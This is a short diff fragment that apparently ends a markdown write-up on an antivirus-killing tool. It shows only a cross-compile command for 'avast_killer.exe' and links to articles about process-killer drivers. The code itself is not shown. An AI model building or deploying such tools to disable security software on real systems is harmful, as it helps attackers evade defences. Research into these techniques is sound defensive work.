+}
+```
+
+> x86_64-w64-mingw32-gcc -o avast_killer.exe avast_killer.c 
+
+### Reference
+
+https://blog.itpub.net/70041575/viewspace-3050026/
+
+https://alice.climent-pommeret.red/posts/process-killer-driver/#the-basics
+
+https://github.com/xalicex/Killers
